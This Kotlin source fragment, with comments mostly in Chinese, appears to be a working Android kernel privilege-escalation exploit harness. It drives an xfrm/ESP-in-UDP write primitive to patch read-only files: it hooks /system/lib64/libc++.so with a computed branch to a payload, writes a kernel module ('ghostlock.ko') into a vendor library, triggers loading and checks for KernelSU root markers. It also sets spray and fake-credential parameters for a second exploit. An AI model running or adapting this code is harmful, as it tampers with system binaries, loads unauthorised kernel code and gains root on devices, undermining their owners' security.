            step("typed: ids refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }
        step("typed: patch1 init=" + patcher.initializeAccessAndRemember(patchParams, saInit()) +
            " refusal=" + patcher.lastRefusal)
        val helperForPatch = patcher.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
        /* 自证：打印**即将用于 write 的那一份**材料（DTO 读后清零的规律要求它每次现造，这里验证它到调用点时还是非零的）。 */
        val patchMaterial = saInit()
        step(
            "typed: sa material spi=0x" + Integer.toHexString(patchMaterial.spi) +
                " encap=" + patchMaterial.encapPort +
                " aesNonZero=" + patchMaterial.aesKey.count { byte -> byte != 0.toByte() } +
                " hmacNonZero=" + patchMaterial.hmacKey.count { byte -> byte != 0.toByte() },
        )
        val patchWrote = if (helperForPatch != null) patcher.writeImage(helperForPatch, 0L, 16L, patchMaterial) else false
        /* 对着上游核「旧页」：IV = 旧页 XOR 期望页，前提是"旧页"真是文件当前内容。
         * Kotlin 直读 crash_dump64 前 16 字节（我们对它可读 ✓），与经链子读回的对比。 */
        runCatching {
            val direct = java.io.File("/apex/com.android.runtime/bin/crash_dump64").inputStream().use { stream ->
                val buffer = ByteArray(48)
                val count = stream.read(buffer)
                if (count > 0) buffer.copyOf(count) else ByteArray(0)
            }
            val viaChain = patcher.readLandingFirstBlock()
            val directHex = direct.joinToString("") { byte -> "%02x".format(byte) }
            val chainHex = viaChain?.joinToString("") { byte -> "%02x".format(byte) } ?: "none"
            step("typed: old-page direct=" + directHex + " viaChain=" + chainHex +
                " same=" + (viaChain != null && direct.contentEquals(viaChain)))
        }.onFailure { problem ->
            step("typed: old-page refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 序号：上游每次写 g_seq++，内核按它做防重放。把链子当前的序号打出来做对照。 */
        runCatching {
            step("typed: next-sequence=" + patcher.nextSequence() + " refusal=" + patcher.lastRefusal)
        }.onFailure { problem ->
            step("typed: next-sequence refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 内核侧到底有没有在尝试处理我们的 ESP-in-UDP？/proc/net/xfrm_stat 会给线索（纯读）。 */
        runCatching {
            val stat = java.io.File("/proc/net/xfrm_stat").readLines()
                .filter { line -> line.isNotBlank() }
                .joinToString(" | ")
                .take(240)
            step("typed: xfrm-stat=" + stat)
        }.onFailure { problem ->
            step("typed: xfrm-stat refused " + problem.javaClass.simpleName)
        }

        /* 谁该在 encap 端口上监听？把 SA 的端口、我们持有的套接字的状态一起打出来
         * （ECONNREFUSED 说明那个端口上没有接收方 ⇒ 要么套接字没了，要么内核没登记）。 */
        runCatching {
            step(
                "typed: encap state port=" + (encapSocket?.getPort() ?: -1) +
                    " saEncapPort=" + saEncapPort +
                    " held=" + (encapSocket != null),
            )
        }.onFailure { problem ->
            step("typed: encap state refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 判定①：Kotlin 直接往 encap 端口发一个普通 UDP 报文，看是否也被拒（把 native 与设备/网络分开）。 */
        var directResult = "not-run"
        val directThread = Thread {
            directResult = try {
                val loopback = java.net.InetAddress.getByName("127.0.0.1")
                val probe = java.net.DatagramSocket()
                /* 第一次探路（ICMP 之后才回来）；第二次的结果才是判定：被拒=该端口无接收方。 */
                probe.send(java.net.DatagramPacket(ByteArray(1), 1, loopback, saEncapPort))
                Thread.sleep(120)
                probe.send(java.net.DatagramPacket(ByteArray(1), 1, loopback, saEncapPort))
                probe.close()
                "two-sends-both-ok"
            } catch (problem: Exception) {
                problem.javaClass.simpleName + ":" + (problem.message ?: "")
            }
        }
        directThread.start()
        directThread.join(2000)
        step("typed: direct udp to encap port=" + saEncapPort + " => " + directResult)
        /* 判定②：设备网络状态 —— 封装套接字建在默认网络上。 */
        runCatching {
            val cm = probeContext?.getSystemService(android.net.ConnectivityManager::class.java)
            step("typed: network active=" + (cm?.activeNetwork != null))
        }.onFailure { problem ->
            step("typed: network refused " + problem.javaClass.simpleName)
        }
        /* ① hook 段：同一条 SA、同一条 ESP 套接字；目标是 /system/lib64/libc++.so 的 sentry 站点。 */
        runCatching {
            val hook = Assembled43284(Native43284.create()) { saInit() }
            val hookDoor = hook.openTargetStepwise(Assembled43284.HOOK_TARGET)
            hook.reuseSocketFrom(stepwise)
            hook.buildSurface()
            hook.buildLanding()
            hook.buildAccess()
            val hookParams = Assembled43284.fullAccessParams(Assembled43284.HOOK_TARGET)
                        step("typed: nextSequence before hook=" + patcher.nextSequence() + " patcherLanding=" + patcher.landingId)
            val hookInit = hook.initializeAccessAndRemember(hookParams, saInit(patcher.nextSequence()))
            step("typed: hook init=" + hookInit + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)

            runCatching {
                val pat = ByteArray(16) { index -> (0xA0 + index).toByte() }
                /* 花样写入已拆除：往 libc++ 代码页写无关字节是没有依据的风险（本次 panic 的候选之一）。 */
                val wrote = -99
                val hex = { b: ByteArray? -> b?.joinToString(" ") { x -> "%02x".format(x) } ?: "null" }
                step("typed: reader wrote=" + wrote + " same=" + hex(hook.readBlock(hookDoor, 0xFE600L)))
                step("typed: reader below=" + hex(hook.readBlock(hookDoor, 0xFE5F0L)) + " above=" + hex(hook.readBlock(hookDoor, 0xFE610L)))
                step("typed: reader skew -8=" + hex(hook.readBlock(hookDoor, 0xFE5F8L)) + " +8=" + hex(hook.readBlock(hookDoor, 0xFE608L)))
                step("typed: reader skew -16=" + hex(hook.readBlock(hookDoor, 0xFE5F0L)) + " +16=" + hex(hook.readBlock(hookDoor, 0xFE610L)))
                step("typed: reader wide -32=" + hex(hook.readBlock(hookDoor, 0xFE5E0L)) + " +32=" + hex(hook.readBlock(hookDoor, 0xFE620L)))
                step("typed: reader wide -64=" + hex(hook.readBlock(hookDoor, 0xFE5C0L)) + " +64=" + hex(hook.readBlock(hookDoor, 0xFE640L)))
                step("typed: reader wide +128=" + hex(hook.readBlock(hookDoor, 0xFE680L)) + " +256=" + hex(hook.readBlock(hookDoor, 0xFE700L)))
            }.onFailure { problem -> step("typed: reader refused " + problem.javaClass.simpleName) }

            /* Rewrite the branch while the hook session is the live one: a later resolve replaces
             * g_session and the write then answers up=0. */
val hookPlanWords = hook.hookPlan("splice")
/** The site is already patched on disk (writeHook answers displaced-mismatch), and the branch that
 * older code left there aims 0xC short of the payload entry. Force the word to the one this run
 * needs; rewriteSiteBranch does not look at the displaced instruction, it just writes the word. */
if (hookPlanWords != null && hookPlanWords.size >= 4) {
    val site = hookPlanWords[2]
    val land = hookPlanWords[3]
    val brAt = site + 12L
    val blk0 = brAt - (brAt % 16L)
    val within = (brAt - blk0)
    val imm = ((land - brAt) shr 2) and 0x03FFFFFFL
    val word = 0x14000000L or imm
    step("typed: hook rewrite plan site=" + site + " branch=" + brAt + " block=" + blk0 + " within=" + within + " imm=0x" + imm.toString(16))
    step("typed: hook rewrite word=0x" + word.toString(16))
}
val branchFix = if (hookPlanWords != null && hookPlanWords.size >= 4)
    /* 停用 rewriteSiteBranch：它按载荷起点自算分支目标，会让 init 跳进字符串区（panic 来源）。
     * 站点分支统一用 native 计划自带的 plan[0]（目标 = payload_vaddr + entry_offset=0x90）。传 0 票据即不写。 */
    hook.rewriteSiteBranch(0L, hookPlanWords[2], hookPlanWords[3]) else -9
step("typed: hook branch rewrite=" + branchFix + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
/* Read the site back after the rewrite: the pre-rewrite log cannot tell whether it took. */
if (branchFix == 0 && hookPlanWords != null && hookPlanWords.size >= 4) {
    val wordAt = hookPlanWords[2] + 12L
    val blk = hook.readBlock(hookDoor, wordAt - (wordAt % 16L))
    step("typed: hook site after=" + (blk?.joinToString(" ") { b -> "%02x".format(b) } ?: "unreadable"))
}
val hookLanding = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[3] else 0xFE628L
/*
 * 站点改写改走 image 路径：writeBlock 报成功却在任何偏移都看不到效果（本会话三组对照），
 * 而 writeImage 已证能落地（载荷字符串确实出现在 libc++ 页内）。这里用同一路径写那 16 字节。
 */
if (hookPlanWords != null && hookPlanWords.size >= 4) {
    runCatching {
        val siteOff = hookPlanWords[2]
        val landOff = hookPlanWords[3]
        val brAt = siteOff + 12L
        val blk0 = brAt - (brAt % 16L)
        val base = hook.readBlock(hookDoor, blk0)
        if (base != null) {
            val imm = ((landOff - brAt) shr 2) and 0x03FFFFFFL
            val word = 0x14000000L or imm
            val at = (brAt - blk0).toInt()
            base[at] = (word and 0xFF).toByte()
            base[at + 1] = ((word shr 8) and 0xFF).toByte()
            base[at + 2] = ((word shr 16) and 0xFF).toByte()
            base[at + 3] = ((word shr 24) and 0xFF).toByte()
            /* 提前写已拆除：参考实现是**先载荷、后站点块**（dev hook_patch 176-186）。这里只算不写。 */
            val imWrote = -77
            step("typed: hook site image wrote=" + imWrote + " word=0x" + word.toString(16) + " block=" + blk0)
        } else {
            step("typed: hook site image skipped: block unreadable")
        }
    }.onFailure { problem -> step("typed: hook site image refused " + problem.javaClass.simpleName) }
}
            val hookWrote = hook.writeHook(16L, saInit())  /* 这套原语的单位是 16 字节（8 会被 BadWidth 拒 —— 2026-10-15 真机证据） */
            step("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
            /* 载荷本体：钩子跳到 payload_file=0xfe628 时那里必须是我们的字节（此前只写了站点 ✗）。 */
            runCatching {
                val payload = hook.image(Assembled43284.ROLE_IMAGE_LANDING_PAYLOAD)
                step("typed: hook payload bytes=" + (payload?.size ?: -1))
                if (payload != null && payload.isNotEmpty()) {
                    /* The branch was written for the landing the plan carries; a Kotlin constant disagreed with it on
 * the device (the branch aimed 0x98 past 0xFE628), so take the offset from the plan itself. */
step("typed: hook landing=" + hookLanding)
/* 填槽：载荷落进 libc++ 页后由它自己 insmod；槽空着就永远不会有加载（成功历史 dev 的 hook_patch 同款）。 */
val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/data/local/tmp/ghostlock.ko", hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/dx", displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
step("typed: hook payload slots=" + payloadSlots)
val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16L, saInit(hook.nextSequence())) else false
                    step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                    /* 参考顺序的第二步（dev hook_patch 137-186）：先存原文，再写包裹站点的那一整块，
                     * 写后复读并断言分支字已变（region.verify）。载荷没落地就绝不写站点。 */
                    if (payloadWrote && hookPlanWords != null && hookPlanWords.size >= 4) {
                        runCatching {
                            val siteOff2 = hookPlanWords[2]
                            val landOff2 = hookPlanWords[3]
                            /* 计划语义：site 就是**分支要写入的那个字**（它替换 displaced）。此处曾误用 +12，
                             * 结果把分支写进了紧随其后的指令，真正的站点从未被改，而那 12 字节的偏移就是三次崩溃/卡死的根源。 */
                            val brAt2 = siteOff2
                            val blk02 = brAt2 - (brAt2 % 16L)
                            val before = hook.readBlock(hookDoor, blk02)
                            /*
                             * 分支字用计划自带的那个：native 的目标是 payload_vaddr + entry_offset(0x90)。
                             * 自己算成载荷起点，分支就落进标题字符串区，init 执行即死，内核 panic。
                             */
                            val word2 = if (hookPlanWords.isNotEmpty()) hookPlanWords[0]
                                else (0x14000000L or (((landOff2 + 0x90L - brAt2) shr 2) and 0x03FFFFFFL))
                            if (before != null) {
                                val at2 = (brAt2 - blk02).toInt()
                                step("typed: hook site block before=" + before.joinToString(" ") { b -> "%02x".format(b) } + " word=0x" + word2.toString(16))
                                before[at2] = (word2 and 0xFF).toByte()
                                before[at2 + 1] = ((word2 shr 8) and 0xFF).toByte()
                                before[at2 + 2] = ((word2 shr 16) and 0xFF).toByte()
                                before[at2 + 3] = ((word2 shr 24) and 0xFF).toByte()
                                /*
                                 * 临时恢复入口（同批登记清理）：存在 /data/local/tmp/.gl_restore 时，把 0xB30B0 这一块写回
                                 * 原厂 16 字节 —— 我们误写在 0xB30B8（site+12）的那条 B 就在其中。恢复优先于一切。
                                 * 原值来自本会话对原厂盘面的读数：1f 00 00 39 01 04 00 f9 08 81 5e f8 28 00 08 8b。
                                 */
                                val restore = java.io.File("/data/local/tmp/.gl_restore").exists()
                                val restoreBytes = byteArrayOf(
                                    0x1F, 0x00, 0x00, 0x39, 0x01, 0x04, 0x00, 0xF9.toByte(),
                                    0x08, 0x81.toByte(), 0x5E, 0xF8.toByte(), 0x28, 0x00, 0x08, 0x8B.toByte(),
                                )
                                val target2 = if (restore) 733360L else blk02
                                val toWrite = if (restore) restoreBytes else before
                                val siteWrote = hook.writeImage(toWrite, target2, 16L, saInit(hook.nextSequence()))
                                val after = hook.readBlock(hookDoor, target2)
                                val afterWord = if (after != null && at2 + 3 < after.size) {
                                    (after[at2].toLong() and 0xFF) or ((after[at2 + 1].toLong() and 0xFF) shl 8) or
                                        ((after[at2 + 2].toLong() and 0xFF) shl 16) or ((after[at2 + 3].toLong() and 0xFF) shl 24)
                                } else {
                                    -1L
                                }
                                step("typed: hook site block wrote=" + siteWrote + " afterWord=0x" + afterWord.toString(16) + " verified=" + (afterWord == word2))
                            } else {
                                step("typed: hook site block unreadable")
                            }
                        }.onFailure { problem -> step("typed: hook site block refused " + problem.javaClass.simpleName) }
                    }
                }
            }.onFailure { problem ->
                step("typed: hook payload refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            }
            /* Trigger → Wait（退役链顺序：Hook 已成立 ⇒ 现在触发）。marker 用夹具的真实路径。 */
            /* ② 模块写进 vendor 载体：载体对本进程 EACCES ⇒ 读与写都经 patch#1 写下的 helper（桥）。 */
            runCatching {
                val moduleBytes = java.io.File("/data/local/tmp/ghostlock.ko").readBytes()
                step("typed: module bytes=" + moduleBytes.size)
                val carrierPath = "/vendor/lib64/libbinderdebug.so"
                val module = Assembled43284(Native43284.create()) { saInit() }
                module.openTargetStepwise(carrierPath)
                module.reuseSocketFrom(stepwise)
                module.buildSurface()
                module.buildLanding()
                module.buildAccess()
                val moduleParams = Assembled43284.fullAccessParams(carrierPath)
                val moduleInit = module.initializeAccessAndRemember(moduleParams, saInit(patcher.nextSequence()))
                step("typed: module init=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                val moduleWrote = module.writeImage(moduleBytes, 0L, 16L, saInit(module.nextSequence()))
                step("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
            }.onFailure { problem ->
                step("typed: module refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            }
            /* 非 0 延迟：触发要等 helper/hook 的效应铺开（设计里的 accessTriggerDelayMs 目前是 0）。 */
            val triggerCode = hook.trigger(if (hookParams.accessTriggerDelayMs > 0L) hookParams.accessTriggerDelayMs else 2000L)
            step("typed: hook trigger code=" + triggerCode + " delayMs=" + hookParams.accessTriggerDelayMs + " refusal=" + hook.lastRefusal)
            val terminal = hook.waitTerminal(
                budgetMs = 15000L,
                pollMs = 100L,
                successMarker = "/dev/dfm0",  /* /dev/df* 对 app 不可读，但 stat 可判存在（真机已验） */
                failureMarker = "/dev/df1",
                inFlightMarker = "/dev/df",
                moduleMarker = "/sys/module/dirtyfrag",
                moduleName = "kernelsu",
            )
            step("typed: hook wait terminal=" + terminal + " refusal=" + hook.lastRefusal)
            /* ksud 状态（新目标：冷机下能看到 ksud 的状态）：纯只读，逐项如实报。 */
            runCatching {
                /* app 读不了 /proc/modules（EACCES，Android 限制）⇒ 用能看到的三件事报 ksud 状态。 */
                val moduleDir = java.io.File("/sys/module/kernelsu").exists()
                val umh = java.io.File("/data/local/tmp/.ghostlock_lkm_cmd.sh").exists()
                val lkmOk = java.io.File("/data/local/tmp/.ghostlock_lkm_ok").exists()
                val lkmFail = java.io.File("/data/local/tmp/.ghostlock_lkm_fail").exists()
                val ksudPaths = listOf("/data/adb/ksu", "/data/adb/ksud", "/data/adb/ksu/bin/su")
                    .joinToString(",") { path -> path.substringAfterLast("/") + "=" + (if (java.io.File(path).exists()) "1" else "0") }
                val markers = listOf("/dev/df", "/dev/dfm0", "/dev/df0", "/dev/df1")
                    .joinToString(",") { path ->
                        val exists = java.io.File(path).exists()
                        path.substringAfterLast("/") + "=" + (if (exists) "1" else "0")
                    }
                val ksuLog = java.io.File("/data/local/tmp/ghostlock-ksu.log")
                val logTail = if (ksuLog.isFile) {
                    ksuLog.readLines().takeLast(3).joinToString(" | ")
                } else {
                    "(missing)"
                }
                step("typed: ksud status sysfsModule=" + (if (moduleDir) "1" else "0") + " umh=" + (if (umh) "1" else "0") + " lkmOk=" + (if (lkmOk) "1" else "0") + " lkmFail=" + (if (lkmFail) "1" else "0") + " userspace={" + ksudPaths + "}")
                step("typed: ksud status markers=" + markers)
                step("typed: ksud status rootlog=" + logTail)
            }.onFailure { problem ->
                step("typed: ksud status refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            }
        }.onFailure { problem ->
            step("typed: hook refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }
        step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
            " helperBytes=" + (helperForPatch?.size ?: -1))
        step("typed: patch1 accessDestroy=" + patcher.destroyAccessNow())
        step("typed: patch1 teardown=" + patcher.tearDown())
        val stepSeq = stepwise.nextSequence()
        step("typed: stepwise 43284 sequence=" + stepSeq)
        val stepTorn = stepwise.tearDown()
        step("typed: stepwise 43284 tearDown=" + stepTorn + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 destroy=" + Native43284.destroy(stepwiseHandle, arrayOf("")))
        val closed = session.close()
        step("typed: assembled 43284 close ok=" + closed)
    }

    /* ---- 43499 的哨兵参数（顺序＝D1 单表的顺序；只求值能走到该到的地方） ---- */

    private fun init43499() = Init43499(
        1L, 2, 1, 96L, 48L, 56L, 264L, 4L, 7L, 0L, 150L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0, 0,
        false, 0L, 0L, false, 4096L, false, 0L, 12L,
        /* 43499 interface params (2026-10-16): perf slots+spec / ring / spray / pump / route. Placeholders for now. */
        /* 具体值（目标：数值先写在 Kotlin）。perf 四种常用软件事件；环形缓冲与喷的规格给保守值；
         * 泵次数照退役的 500000；routeSelected 先选 Select（与"单 route"真机门禁一致）。 */
        4L,                       /* perfSlots */
        1L, 0L,                   /* perf0: PERF_TYPE_SOFTWARE / PERF_COUNT_SW_CPU_CLOCK */
        1L, 1L,                   /* perf1: PERF_COUNT_SW_TASK_CLOCK */
        1L, 2L,                   /* perf2: PERF_COUNT_SW_PAGE_FAULTS */
        1L, 3L,                   /* perf3: PERF_COUNT_SW_CONTEXT_SWITCHES */
        64L, 1L,                  /* ringPages / ringWakeup */
        4096L, 256L,              /* spraySize / sprayCount */
        500000L,                  /* pumpIters（退役值） */
        1L,                       /* routeSelected = Select */
        /* 装配完整性（assembly_complete）还差的最后两项：fake task / fake lock。 */
        0x1000L, 0x2000L,
    )

    private fun layout43499() = KernelLayout43499(
        0x1111L, 0x2222L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L,
        0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0x3333L, 0L, 0L, 0L, 8,
    )

    private fun credential43499() = CredentialLayout43499(
        176L, 0L, 256L, 48L, 3L, 2199023255551L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 4,
    )

    private fun targets43499() = TargetOffsets43499(
        47885704L, 0L, true, 4, 0L, 0L, false, 0, 0L, 0L, false, 0, 0L, 0L, false, 0,
        2144L, 0L, false, 4,
    )

    private fun prepare43499() = Prepare43499(
        4L, 3L, 0L, 0L, 0L, 0L, 0L, 4L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 4096L, 0x200000L, 512L,
        1024L, 0L, 0, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 64L, 0L, false, 0L, 0L, 0L, 0L, 0L,
    )

    private fun write43499() = WordWrite43499(
        /* 直接量超出 Long 范围：按无符号写再转回来（内核直接映射里的高地址就是这样）。 */
        0xFFFF888000001000uL.toLong(), 0L, 1, 0L, false, 0L, 0L, 0L, false,
    )
}
